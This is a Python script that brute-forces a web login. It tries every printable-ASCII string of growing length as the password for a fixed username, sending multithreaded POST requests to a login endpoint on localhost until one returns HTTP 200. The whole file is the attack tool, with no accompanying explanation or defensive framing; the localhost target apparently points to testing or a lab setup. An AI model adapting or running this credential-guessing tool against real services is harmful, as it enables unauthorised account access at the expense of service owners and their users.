import requests
import itertools
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Event

ENDPOINT = "http://localhost:8080/login"
HEADERS = {'Content-Type': 'application/json'}
password_found_event = Event()
ASCII_RANGE = range(33, 127)
NUM_WORKERS = 7

def generate_passwords():
    length = 1
    while True:
        for password in itertools.product(ASCII_RANGE, repeat=length):
            yield ''.join(map(chr, password))
        length += 1

def try_password(password):
    payload = {"username": "username", "password": password}
    response = requests.post(ENDPOINT, json=payload, headers=HEADERS)
    return response.status_code == 200

def worker(password_generator):
    for password in password_generator:
        if password_found_event.is_set():
            break
        if try_password(password):
            password_found_event.set()
            return password

if __name__ == "__main__":
    password_generator = generate_passwords()
    start_time = time.time()

    with ThreadPoolExecutor() as executor:
        futures = [executor.submit(worker, password_generator) for _ in range(NUM_WORKERS)]
        found_password = next((future.result() for future in as_completed(futures) if future.result()), None)

    if found_password:
        elapsed_time = time.time() - start_time
        print(f"Found password: {found_password}")
        print(f"Time taken: {elapsed_time:.2f} seconds")
    else:
        print("Password not found!")

